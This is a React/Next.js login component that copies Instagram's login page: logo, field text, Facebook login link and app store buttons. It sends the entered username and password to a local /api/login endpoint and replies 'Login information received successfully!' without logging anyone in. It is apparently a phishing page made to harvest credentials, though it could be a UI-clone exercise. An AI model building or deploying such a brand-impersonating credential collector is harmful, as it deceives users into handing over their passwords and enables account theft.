'use client';

import { useState } from 'react';
import Image from 'next/image';

export default function Login() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [errors, setErrors] = useState({
    username: '',
    password: ''
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitMessage, setSubmitMessage] = useState('');

  const validateForm = () => {
    const newErrors = {
      username: '',
      password: ''
    };

    // Username validation
    if (!username) {
      newErrors.username = 'Username is required';
    } else if (!isValidEmail(username) && !isValidUsername(username)) {
      newErrors.username = 'Please enter a valid email or username';
    }

    // Password validation
    if (!password) {
      newErrors.password = 'Password is required';
    } else if (password.length < 6) {
      newErrors.password = 'Password must be at least 6 characters';
    }

    setErrors(newErrors);
    return !newErrors.username && !newErrors.password;
  };

  const isValidEmail = (email: string) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  const isValidUsername = (username: string) => {
    const usernameRegex = /^[a-zA-Z0-9_.]+$/;
    return usernameRegex.test(username) && username.length >= 3;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitMessage('');
    
    if (!validateForm()) {
      return;
    }
    
    setIsSubmitting(true);
    
    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, password }),
      });
      
      const data = await response.json();
      
      if (response.ok) {
        setSubmitMessage('Login information received successfully!');
        // Clear form
        setUsername('');
        setPassword('');
      } else {
        setSubmitMessage(`Error: ${data.error}`);
      }
    } catch (error) {
      console.error('Submission error:', error);
      setSubmitMessage('Failed to submit login information. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleInputChange = (field: string, value: string) => {
    if (field === 'username') {
      setUsername(value);
      // Clear error when user starts typing
      if (errors.username) {
        setErrors({ ...errors, username: '' });
      }
    } else if (field === 'password') {
      setPassword(value);
      // Clear error when user starts typing
      if (errors.password) {
        setErrors({ ...errors, password: '' });
      }
    }
    
    // Clear success message when user starts typing again
    if (submitMessage) {
      setSubmitMessage('');
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50 py-12 px-4 sm:px-6 lg:px-8">
      <div className="max-w-md w-full space-y-8">
        <div className="bg-white py-8 px-4 shadow rounded-lg sm:px-10">
          {/* Instagram Logo */}
          <div className="flex justify-center mb-6">
            <div className="h-14 w-64 relative">
              <Image
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
                alt="Instagram"
                fill
                className="object-contain"
              />
            </div>
          </div>

          {/* Login Form */}
          <form className="space-y-4" onSubmit={handleSubmit} noValidate>
            <div>
              <input
                type="text"
                placeholder="Phone number, username, or email"
                className={`appearance-none rounded-md relative block w-full px-3 py-3 border ${
                  errors.username ? 'border-red-500' : 'border-gray-300'
                } placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm bg-gray-50`}
                value={username}
                onChange={(e) => handleInputChange('username', e.target.value)}
                onBlur={() => validateForm()}
              />
              {errors.username && (
                <p className="mt-1 text-xs text-red-600">{errors.username}</p>
              )}
            </div>
            
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                className={`appearance-none rounded-md relative block w-full px-3 py-3 border ${
                  errors.password ? 'border-red-500' : 'border-gray-300'
                } placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm bg-gray-50 pr-10`}
                value={password}
                onChange={(e) => handleInputChange('password', e.target.value)}
                onBlur={() => validateForm()}
              />
              <button
                type="button"
                className="absolute inset-y-0 right-0 pr-3 flex items-center text-sm text-gray-500"
                onClick={() => setShowPassword(!showPassword)}
              >
                {showPassword ? 'Hide' : 'Show'}
              </button>
              {errors.password && (
                <p className="mt-1 text-xs text-red-600">{errors.password}</p>
              )}
            </div>

            <div>
              <button
                type="submit"
                disabled={isSubmitting || !username || !password}
                className={`group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white ${
                  (username && password && !isSubmitting) 
                    ? 'bg-blue-500 hover:bg-blue-600' 
                    : 'bg-blue-300 cursor-not-allowed'
                } focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition-colors`}
              >
                {isSubmitting ? 'Processing...' : 'Log In'}
              </button>
            </div>

            {submitMessage && (
              <div className={`text-center text-sm ${submitMessage.includes('Error') ? 'text-red-600' : 'text-green-600'}`}>
                {submitMessage}
              </div>
            )}

            <div className="flex items-center my-6">
              <div className="border-t border-gray-300 flex-grow"></div>
              <div className="mx-4 text-gray-500 text-sm font-semibold">OR</div>
              <div className="border-t border-gray-300 flex-grow"></div>
            </div>

            <div className="flex justify-center items-center">
              <button
                type="button"
                className="text-blue-900 font-medium flex items-center space-x-2"
              >
                <svg className="w-5 h-5 text-blue-900" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M22.675 0h-21.35c-.732 0-1.325.593-1.325 1.325v21.351c0 .731.593 1.324 1.325 1.324h11.495v-9.294h-3.128v-3.622h3.128v-2.671c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12v9.293h6.116c.73 0 1.323-.593 1.323-1.325v-21.35c0-.732-.593-1.325-1.325-1.325z"/>
                </svg>
                <span>Log in with Facebook</span>
              </button>
            </div>

            <div className="text-center">
              <a href="#" className="text-xs text-blue-900 hover:underline">
                Forgot password?
              </a>
            </div>
          </form>
        </div>

        {/* Sign Up Section */}
        <div className="bg-white py-4 px-4 shadow rounded-lg sm:px-10 text-center">
          <p className="text-sm">
            Don't have an account?{' '}
            <a href="#" className="font-medium text-blue-500 hover:text-blue-600">
              Sign up
            </a>
          </p>
        </div>

        {/* Get the app Section */}
        <div className="text-center">
          <p className="text-sm my-4">Get the app.</p>
          <div className="flex justify-center space-x-4">
            <button className="flex items-center justify-center bg-black text-white rounded px-4 py-2 text-sm font-medium">
              <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701z"/>
              </svg>
              App Store
            </button>
            <button className="flex items-center justify-center bg-black text-white rounded px-4 py-2 text-sm font-medium">
              <svg className="w-5 h-5 mr-2" viewBox="0 0 24 24">
                <path
                  fill="currentColor"
                  d="M3,20.5V3.5C3,2.91 3.34,2.39 3.84,2.15L13.69,12L3.84,21.85C3.34,21.6 3,21.09 3,20.5M16.81,15.12L6.05,21.34L14.54,12.85L16.81,15.12M20.16,10.81C20.5,11.08 20.75,11.5 20.75,12C20.75,12.5 20.53,12.9 20.18,13.18L17.89,14.5L15.39,12L17.89,9.5L20.16,10.81M6.05,2.66L16.81,8.88L14.54,11.15L6.05,2.66Z"
                />
              </svg>
              Google Play
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}